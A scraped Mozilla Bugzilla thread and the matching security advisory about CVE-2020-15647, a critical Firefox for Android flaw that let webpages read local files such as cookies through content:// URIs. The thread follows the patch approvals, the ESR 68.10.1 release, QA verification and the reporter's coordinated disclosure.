[Bug 1647078](/show_bug.cgi?id=1647078 "VERIFIED FIXED - content:// provider allows websites to remotely steal any file from the device if the path is known") - Load content:// URIs from intents as file://.

### Security Approval Request

* **How easily could an exploit be constructed based on the patch?**: Experimenting with content:// URLs quickly leads to various exploits. How to construct an exploit to read internal files like cookies might not be immediately obvious, but any skilled researcher could definitely do that. We can squash the patches and add a vague commit message to mitigate these concerns, however I would assume that any ESR patch gets a lot of scrutiny anyway.
* **Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?**: Yes
* **Which older supported branches are affected by this flaw?**: esr only
* **If not all supported branches, which bug introduced the flaw?**: None
* **Do you have backports for the affected branches?**: Yes
* **If not, how different, hard to create, and risky will they be?**: N/A this code is only in ESR68
* **How likely is this patch to cause regressions; how much testing does it need?**: The code is involved, so regressions are possible. Worst case scenario is Fennec crashes when opening a download or an intent from a third-party app. We ran QA regression testing on these scenarios.

### ESR Uplift Approval Request

* **If this is not a sec:{high,crit} bug, please state case for ESR consideration**: sec-crit
* **User impact if declined**: Any webpage can easily steal all user data (cookies, passwords, etc)
* **Fix Landed on Version**: pending
* **Risk to taking this patch**: High
* **Why is the change risky/not risky? (and alternatives if risky)**: The patch is android-only.

  We have to close a few holes in our content:// protocol handling, also we don't have any baking in any other channel since this is a ESR only bug.

A marginally less risky approach would be to remove the feature outright, that means that users would not be able to open attachments from email in Fennec, which has been a feature since 2018.

* **String or UUID changes made by this patch**: none
[Attachment #9159562](/attachment.cgi?id=9159562&action=edit "Bug 1647078 - Load content:// URIs from intents as file://.") -
Flags: sec-approval?
[Attachment #9159562](/attachment.cgi?id=9159562&action=edit "Bug 1647078 - Load content:// URIs from intents as file://.") -
Flags: approval-mozilla-esr68?

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a873436_421286)• 5 years ago |

[Attachment #9159563](/attachment.cgi?id=9159563&action=edit "Bug 1647078 - Never handle content:// channels from Web.") -
Flags: sec-approval?
[Attachment #9159564](/attachment.cgi?id=9159564&action=edit "Bug 1647078 - Use random file names when copying a content:// URI.") -
Flags: sec-approval?
[Attachment #9159565](/attachment.cgi?id=9159565&action=edit "Bug 1647078 - Always copy content:// files.") -
Flags: sec-approval?
[Attachment #9159742](/attachment.cgi?id=9159742&action=edit "Bug 1647078 - Restrict content:// paths to external storage.") -
Flags: sec-approval?
[Attachment #9159814](/attachment.cgi?id=9159814&action=edit "Bug 1647078 - Don't load Web-originated intents that open in the browser.") -
Flags: sec-approval?

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 69](/show_bug.cgi?id=1647078#c69)• 5 years ago |
|  | |

Comment on [attachment 9159562](/attachment.cgi?id=9159562 "Bug 1647078 - Load content:// URIs from intents as file://.") [[details]](/attachment.cgi?id=9159562&action=edit "Bug 1647078 - Load content:// URIs from intents as file://.")

[Bug 1647078](/show_bug.cgi?id=1647078 "VERIFIED FIXED - content:// provider allows websites to remotely steal any file from the device if the path is known") - Load content:// URIs from intents as file://.

sec-approval+ to land whenever release drivers give you the OK for the branch uplift.

Do we want to also land this on nightly just in case people have forked this code for their own use? Or have we landed lots of ESR-branch-only patches prior to this?

[Attachment #9159562](/attachment.cgi?id=9159562&action=edit "Bug 1647078 - Load content:// URIs from intents as file://.") -
Flags: sec-approval? → sec-approval+

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a886665_1689)• 5 years ago |

[Attachment #9159814](/attachment.cgi?id=9159814&action=edit "Bug 1647078 - Don't load Web-originated intents that open in the browser.") -
Flags: sec-approval? → sec-approval+

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a886673_1689)• 5 years ago |

[Attachment #9159563](/attachment.cgi?id=9159563&action=edit "Bug 1647078 - Never handle content:// channels from Web.") -
Flags: sec-approval? → sec-approval+

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a886678_1689)• 5 years ago |

[Attachment #9159564](/attachment.cgi?id=9159564&action=edit "Bug 1647078 - Use random file names when copying a content:// URI.") -
Flags: sec-approval? → sec-approval+

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a886682_1689)• 5 years ago |

[Attachment #9159742](/attachment.cgi?id=9159742&action=edit "Bug 1647078 - Restrict content:// paths to external storage.") -
Flags: sec-approval? → sec-approval+

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a886689_1689)• 5 years ago |

[Attachment #9159565](/attachment.cgi?id=9159565&action=edit "Bug 1647078 - Always copy content:// files.") -
Flags: sec-approval? → sec-approval+

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 70](/show_bug.cgi?id=1647078#c70)• 5 years ago |
|  | |

(In reply to Daniel Veditz [:dveditz] from [comment #69](/show_bug.cgi?id=1647078#c69 "VERIFIED FIXED - content:// provider allows websites to remotely steal any file from the device if the path is known"))

> Do we want to also land this on nightly just in case people have forked this code for their own use? Or have we landed lots of ESR-branch-only patches prior to this?

discussed privately, there's no m-c counterpart to this, so nothing to land on nightly.

|  | [Pedro Oliveira](/user_profile?user_id=665275)  Reporter |  |
| --- | --- | --- |
| [Comment 71](/show_bug.cgi?id=1647078#c71)• 5 years ago |
|  | |

Hello everyone,

I can confirm the fix landed in the latest Firefox version available in Google Play Store.

I want to take the opportunity to congratulate everyone involved for their transparency and professionalism in dealing with this issue.

I would also like to task if this is going to be part of any security advisory and/or CVE.

Thanks,

@kanytu

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 72](/show_bug.cgi?id=1647078#c72)• 5 years ago |
|  | |

@kanytu, we haven't shipped a fixed release yet. Our plan was to build and ship a 68.10.1 release with this fix early this week.

|  | [Pedro Oliveira](/user_profile?user_id=665275)  Reporter |  |
| --- | --- | --- |
| [Comment 73](/show_bug.cgi?id=1647078#c73)• 5 years ago |
|  | |

You are right. I forgot to give STORAGE permissions to Firefox before making the test :/

Sorry to bother.

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a1383240_75935)• 5 years ago |

[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=%3F) → [78+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=78%2B)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 74](/show_bug.cgi?id=1647078#c74)• 5 years ago |
|  | |

Comment on [attachment 9159562](/attachment.cgi?id=9159562 "Bug 1647078 - Load content:// URIs from intents as file://.") [[details]](/attachment.cgi?id=9159562&action=edit "Bug 1647078 - Load content:// URIs from intents as file://.")

[Bug 1647078](/show_bug.cgi?id=1647078 "VERIFIED FIXED - content:// provider allows websites to remotely steal any file from the device if the path is known") - Load content:// URIs from intents as file://.

Approved for Fennec 68.10.1.

[Attachment #9159562](/attachment.cgi?id=9159562&action=edit "Bug 1647078 - Load content:// URIs from intents as file://.") -
Flags: approval-mozilla-esr68? → approval-mozilla-esr68+

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 75](/show_bug.cgi?id=1647078#c75)• 5 years ago |
|  | |

Attached file
[Bug 1647078 - Fix unit tests and checkstyle. a=RyanVM](attachment.cgi?id=9161643)
— [Details](attachment.cgi?id=9161643&action=edit)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 76](/show_bug.cgi?id=1647078#c76)• 5 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9161647)
— [Details](attachment.cgi?id=9161647&action=edit)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 77](/show_bug.cgi?id=1647078#c77)• 5 years ago |
| uplift | |

FIREFOX\_ESR\_68\_10\_X\_RELBRANCH (68.10.1):

<https://hg.mozilla.org/releases/mozilla-esr68/rev/ad9ac638aa8f2105e9854169fe0de333e463beb6>

<https://hg.mozilla.org/releases/mozilla-esr68/rev/c87234a340c14826aabf41afc0da0f9df765392f>

<https://hg.mozilla.org/releases/mozilla-esr68/rev/003ff248966ae98bddc028882e4c70e00b56ea10>

<https://hg.mozilla.org/releases/mozilla-esr68/rev/f5b74d48979155c082baf699716290d2f154b9c5>

<https://hg.mozilla.org/releases/mozilla-esr68/rev/bb07a1c15096474bc00516258e5ec4d622ecc718>

<https://hg.mozilla.org/releases/mozilla-esr68/rev/7e2374db758b3cfcc74a9f26aea9911418ba711c>

<https://hg.mozilla.org/releases/mozilla-esr68/rev/69fce10096d5ee43bd6f3a979631d62174d652a7>

default (68.11+):

<https://hg.mozilla.org/releases/mozilla-esr68/rev/d2dba14d515116e556e6403263df12062fef49e3>

<https://hg.mozilla.org/releases/mozilla-esr68/rev/0c161b487485ec2f1a0248082e05e3e93b4c3317>

<https://hg.mozilla.org/releases/mozilla-esr68/rev/bfa52add2ca5094a9bc2485f6266d670f0412372>

<https://hg.mozilla.org/releases/mozilla-esr68/rev/04a1051357b379b59965d46c1a0266bda38288a3>

<https://hg.mozilla.org/releases/mozilla-esr68/rev/97ae634f83d1d971384d6bf772cd49988ab20952>

<https://hg.mozilla.org/releases/mozilla-esr68/rev/f1ee7e600869cc5209278ba1851c2b515a4244be>

<https://hg.mozilla.org/releases/mozilla-esr68/rev/8fbc6afcebf60d4ddb81f8aa603f0961262355a5>

Status: ASSIGNED → RESOLVEDClosed: 5 years ago
[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=fixed)Resolution: --- → FIXED

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a1408521_1689)• 5 years ago |

Group: mobile-core-security → core-security-release

|  | [Diana Rus](/user_profile?user_id=636695) |  |
| --- | --- | --- |
| [Comment 78](/show_bug.cgi?id=1647078#c78)• 5 years ago |
|  | |

Hi, verified as fixed with Google Pixel 3 XL (Android 9)-sends user directly to Google Playstore->Firefox and Samsung Galaxy S9 (Android 8) on Firefox Release 68.10.1 with same outcomes present in [Comment 64](/show_bug.cgi?id=1647078#c64 "VERIFIED FIXED - content:// provider allows websites to remotely steal any file from the device if the path is known") and with same scenarios from [Comment67](/show_bug.cgi?id=1647078#c67 "VERIFIED FIXED - content:// provider allows websites to remotely steal any file from the device if the path is known").

No javascript message present, empty iframe and no crashes encountered.

Status: RESOLVED → VERIFIED

|  | [Diana Rus](/user_profile?user_id=636695) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a1459546_636695)• 5 years ago |

[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=verified)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a1482129_1689)• 5 years ago |

Flags: sec-bounty? → sec-bounty+

|  | [BugBot [:suhaib / :marco/ :calixte]](/user_profile?user_id=575867) |  |
| --- | --- | --- |
| [Comment 79](/show_bug.cgi?id=1647078#c79)• 5 years ago |
|  | |

As part of a security bug pattern analysis, we are requesting your help with a high level analysis of this bug. It is our hope to develop static analysis (or potentially runtime/dynamic analysis) in the future to identify classes of bugs.

Please visit [this google form](https://docs.google.com/forms/d/e/1FAIpQLSe9uRXuoMK6tRglbNL5fpXbun_oEb6_xC2zpuE_CKA_GUjrvA/viewform?usp=pp_url&entry.2124261401=https%3A%2F%2Fbugzilla.mozilla.org%2Fshow_bug.cgi%3Fid%3D1647078) to reply.

Flags: needinfo?(agi)Whiteboard: [reporter-external] [client-bounty-form] [verif?] → [reporter-external] [client-bounty-form] [verif?][sec-survey]

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 80](/show_bug.cgi?id=1647078#c80)• 5 years ago |
|  | |

Done.

Flags: needinfo?(agi)

|  | [Stefan Arentz | :st3fan | ⏰ EST | he/him](/user_profile?user_id=388264) |  |
| --- | --- | --- |
| [Comment 81](/show_bug.cgi?id=1647078#c81)• 5 years ago |
|  | |

Thanks Agi - I looked at the form but wasn't sure what to put in there. Except for one thing: I think static code analysis is probably very tricky for this specific bug. (Or maye you had a different idea about that, i'm curious) - But, there is another type of analysis we could do: audit the AndroidManifest.xml and check for changes in for example intent handlers or supported content types. So that when those change, a patch will get flagged as needing a security review. Cc to :sylvestre

Flags: needinfo?(sledru)

|  | [Sylvestre Ledru [:Sylvestre]](/user_profile?user_id=495955) |  |
| --- | --- | --- |
| [Comment 82](/show_bug.cgi?id=1647078#c82)• 5 years ago |
|  | |

Redirecting to Freddy (he is the one owning this rule)

Flags: needinfo?(sledru) → needinfo?(fbraun)

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a1928888_159069)• 5 years ago |

See Also: → [CVE-2020-15649](/show_bug.cgi?id=1652364 "VERIFIED FIXED - Private files are allowed to be uploaded (exfiltration)")

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a1928987_159069)• 5 years ago |

See Also: → [CVE-2020-15650](/show_bug.cgi?id=1652360 "VERIFIED FIXED - Path traversal in upload feature allows internal file overwrite")

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 83](/show_bug.cgi?id=1647078#c83)• 5 years ago |
|  | |

Thanks! I've added this to the response we have on file for this bug.

Flags: needinfo?(fbraun)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a2249237_578488)• 5 years ago |

Alias: CVE-2020-15647

|  | [Pedro Oliveira](/user_profile?user_id=665275)  Reporter |  |
| --- | --- | --- |
| [Comment 84](/show_bug.cgi?id=1647078#c84)• 4 years ago |
|  | |

Hello again,

I'm planning to disclose this bug in a write-up by November.

I'm willing to share the draft here before publish.

However, I would like to ask if the timing is appropriate given the severity of the issue.

I can omit some details if necessary. Do you think it's okay to disclose this by that time?

Thank you,

kanytu

|  | [Pedro Oliveira](/user_profile?user_id=665275)  Reporter |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a11077988_665275)• 4 years ago |

Flags: needinfo?(dveditz)

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 85](/show_bug.cgi?id=1647078#c85)• 4 years ago |
|  | |

Thanks for reaching out.

We're expecting users to have received an update for a while now, feel free to go ahead. We'd be interested to read your blog post, when it's ready. Mostly out of curiosity, though.

Great bug and thanks for checking in, Pedro!

Flags: needinfo?(dveditz)

|  | [Pedro Oliveira](/user_profile?user_id=665275)  Reporter |  |
| --- | --- | --- |
| [Comment 86](/show_bug.cgi?id=1647078#c86)• 4 years ago |
|  | |

Hey again team,

The writeup has been published today. You can check it out here:

“Firefox and how a website could steal all of your cookies” by Pedro Oliveira [https://medium.com/@kanytu/firefox-and-how-a-website-could-steal-all-of-your-cookies-581fe4648e8d](https://medium.com/%40kanytu/firefox-and-how-a-website-could-steal-all-of-your-cookies-581fe4648e8d)

Once again, thank you

@kanytu

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a15677156_1689)• 4 years ago |

Group: core-security-release

|  | [Nobody; OK to take it and work on it](/user_profile?user_id=1) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a15912234_1)• 4 years ago |

Product: Firefox for Android → Firefox for Android Graveyard

|  | [Kevin Brosnan [Ex-Mozilla]](/user_profile?user_id=406670) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a23185832_406670)• 4 years ago |

Flags: needinfo?(kbrosnan)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a95118779_1689)• 2 years ago |

See Also: → <https://bugs.chromium.org/p/chromium/issues/detail?id=144866>

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a124425661_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1647078&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Pedro Oliveira](/user_profile?user_id=665275)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from www.mozilla.org_d778f3a2_20250119_121031.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2020-27

## Security Vulnerabilities fixed in Firefox for Android 68.10.1

Announced
July 6, 2020
Impact
critical
Products
Firefox
Fixed in

* Firefox 68.10.1

#### [#CVE-2020-15647: Arbitrary local file access in Firefox for Android](#CVE-2020-15647)

Reporter
Pedro Oliveira
Impact
critical
##### Description

A Content Provider in Firefox for Android allowed local files accessible by the browser to be read by a remote webpage, leading to sensitive data disclosure, including cookies for other origins.

##### References

* [Bug 1647078](https://bugzilla.mozilla.org/show_bug.cgi?id=1647078)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)


